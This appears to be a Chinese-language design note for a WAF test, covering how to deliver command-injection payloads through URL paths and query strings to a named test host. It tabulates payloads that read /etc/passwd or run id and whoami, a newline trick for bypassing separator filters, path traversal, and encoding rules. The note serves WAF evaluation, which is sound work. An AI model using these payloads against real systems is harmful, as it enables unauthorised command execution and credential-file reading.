# URL 投递形式分析

## 目标访问方式

```
GET http://43.136.161.54/{payload}
Host: miniproject.testwaf.com
```

Tencent WAF 直接测试模式：payload 的 `content` 字段直接拼接到 URL 路径中。

## 可用的 Payload 投递形式

### 形式 A：URL 路径注入

Payload 直接作为 URL 路径段，利用后端将路径参数传递给 shell 的漏洞。

| Payload content | 实际 HTTP 请求 | 适用场景 |
|---|---|---|
| `;cat /etc/passwd` | `GET /;cat /etc/passwd` | PHP `shell_exec("ping " . $_SERVER['PATH_INFO'])` |
| `\|whoami` | `GET /\|whoami` | 管道注入，需要前置命令产生输出 |
| `\|\|id` | `GET /\|\|id` | 前置命令失败时执行 |
| `&&id` | `GET /&&id` | 前置命令成功时执行 |
| `%0aid` | `GET /%0aid` | 换行符注入，绕过 `;` `\|` `&` 过滤 |
| `$(id)` | `GET /$(id)` | 命令替换，shell 先执行内部命令 |
| `` `id` `` | `GET /`id` ` | 反引号命令替换 |

### 形式 B：URL 查询参数注入

Payload 作为查询参数，模拟 DVWA 等应用读取参数后拼接到 shell。

| Payload content | 实际 HTTP 请求 | 适用场景 |
|---|---|---|
| `?ip=127.0.0.1;id` | `GET /?ip=127.0.0.1;id` | DVWA 类 app：`system("ping " . $_GET['ip'])` |
| `?cmd=;id` | `GET /?cmd=;id` | 通用命令注入：`system($_GET['cmd'])` |
| `?host=\|id` | `GET /?host=\|id` | 管道注入变体 |
| `?name=$(id)` | `GET /?name=$(id)` | 命令替换注入 |

### 形式 C：URL 路径 + 查询参数组合

| Payload content | 实际 HTTP 请求 | 适用场景 |
|---|---|---|
| `cgi-bin/test?ip=;id` | `GET /cgi-bin/test?ip=;id` | CGI 脚本注入 |
| `api/v1/ping?host=\|whoami` | `GET /api/v1/ping?host=\|whoami` | REST API 注入 |
| `search?q=;cat+/etc/passwd` | `GET /search?q=;cat+/etc/passwd` | 搜索功能注入 |

### 形式 D：路径遍历 + 命令注入

| Payload content | 实际 HTTP 请求 | 适用场景 |
|---|---|---|
| `../../bin/cat+/etc/passwd` | `GET /../../bin/cat+/etc/passwd` | 路径遍历到系统命令 |
| `..%2F..%2Fbin%2Fid` | `GET /..%2F..%2Fbin%2Fid` | URL 编码路径遍历 |

## 分隔符兼容性

URL 中某些字符有特殊含义，需要处理：

| Shell 分隔符 | URL 含义 | URL 中的处理 |
|---|---|---|
| `;` | 无特殊含义 | ✅ 直接可用 |
| `\|` | 无特殊含义 | ✅ 直接可用 |
| `\|\|` | 无特殊含义 | ✅ 直接可用 |
| `&&` | 无特殊含义 | ✅ 直接可用 |
| `&` | 查询参数分隔符 | ⚠️ 需编码为 `%26` |
| `\n` / `%0a` | 换行符编码 | ✅ `%0a` 已是 URL 编码 |
| `$(...)` | `$` 和 `()` 无特殊含义 | ✅ 直接可用 |
| `` `...` `` | 无特殊含义 | ✅ 直接可用 |
| `#` | URL 片段标识符 | ❌ 需编码为 `%23` |
| 空格 | 需编码 | 编码为 `+` 或 `%20` |

## 当前 Payload 库转换策略

### 表单字段 (167) → URL 路径 / URL 查询参数

原始格式（DVWA）：`127.0.0.1; cat /etc/passwd`
转换后：`;cat /etc/passwd`（URL 路径）或 `?ip=127.0.0.1;cat /etc/passwd`（URL 查询参数）

### 请求头 (131) → URL 查询参数

原始格式（awk/system 模板）：`'{system("echo AWK_SYS_OK")}'`
转换后：`?q='{system("echo AWK_SYS_OK")}'` 或提取命令 `;echo AWK_SYS_OK`

### 注意事项

1. `&` 分隔符必须编码为 `%26`，否则 URL 解析会将后续内容视为新参数
2. 空格在 URL 路径中通常不编码，但建议编码为 `+` 或 `%20`
3. `#` 及之后内容是 URL 片段，不会发送到服务器——必须编码
4. `/` 是路径分隔符，不能在注入命令中间使用（但 `/etc/passwd` 这种"参数中的路径"无影响）
